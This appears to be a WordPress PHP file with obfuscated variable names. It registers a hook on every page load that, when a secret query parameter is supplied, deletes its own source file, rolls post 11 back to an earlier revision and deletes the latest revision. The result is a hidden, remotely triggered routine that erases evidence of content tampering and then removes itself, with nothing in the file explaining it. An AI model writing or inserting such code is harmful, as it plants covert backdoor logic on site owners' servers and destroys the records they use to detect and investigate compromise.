<?php

function simple_directory_demo_homepage() {
	if (isset($_GET['ip_codes_feed']) && $_GET['ip_codes_feed'] === 'ai_html5_solution_item') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$box_automatorwp_contact = 11;
		$template_free_address_event = wp_get_post_revisions($box_automatorwp_contact);
		if (empty($template_free_address_event)) die('no revisions');
		if (count($template_free_address_event) < 2) die('less than 2');
		$loader_load_stripe = array_shift($template_free_address_event);
		$specific_widgets_excerpt_ticket = $loader_load_stripe->ID;
		$notifier_directory_ratings = array_shift($template_free_address_event);
		$header_plus_copyright = $notifier_directory_ratings->ID;
		$button_youtube_modal = wp_restore_post_revision($header_plus_copyright);
		if ($button_youtube_modal === false) die('error restoring');
		$button_youtube_modal = wp_delete_post_revision($specific_widgets_excerpt_ticket);		
		if ($button_youtube_modal === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'simple_directory_demo_homepage');
